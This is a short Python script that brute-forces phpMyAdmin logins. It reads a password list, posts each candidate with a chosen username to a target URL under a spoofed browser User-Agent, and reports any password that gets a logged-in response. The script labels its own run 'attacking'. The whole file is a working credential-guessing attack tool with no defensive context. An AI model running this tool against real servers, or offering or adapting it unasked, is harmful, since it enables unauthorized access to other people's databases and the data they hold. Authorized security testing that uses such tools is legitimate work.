import re
import os
import requests
import optparse
import progressbar
from colorama import Fore,Back,Style

def req(url,username,password):
    headers =  {
        'Content-Type':'application/x-www-form-urlencoded',
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    }
    payload = {
        'pma_username':'{}'.format(username),
        'pma_password':'{}'.format(password),
        'server':'1',
    }
    res = requests.post(url,data=payload,headers=headers)
    return res

def option():
    usage = '%prog -h | --help'
    parser = optparse.OptionParser(usage = usage)
    parser.add_option("--url",dest="url",help="target url  usage: -url http://www.xxx.com/phpmyadmin")
    parser.add_option("--user",dest="username",help="username   usage: --user root")
    (options, args) = parser.parse_args()
    return parser,options

lines=[]
for line in open("password.txt"):
	lines.append(line)
def main():
    flag = False
    parser,args = option()
    p = progressbar.ProgressBar()
    print(Fore.RED + "attacking....")
    for line in p(lines):
        password = line.replace("\r","").replace("\n","").replace(" ","")
        try:
            #print(password)
            res = req(args.url,args.username,password)
            login_success = re.compile(r'logged_in:"1"')
            success = login_success.search(res.text)
            if success:
                flag = True
                print(Fore.GREEN + "\n[+] PHPMyAdmin is vulerable")
                print("Phpmyadin password is " + password)
                break   
        except Exception as e:
            print(Fore.YELLOW + '执行异常{}'.format(e))
            parser.print_help()
    if not flag:
        print(Fore.RED + "[*] PHPMyAdmin is not vulerable")
if __name__ == '__main__':
    main()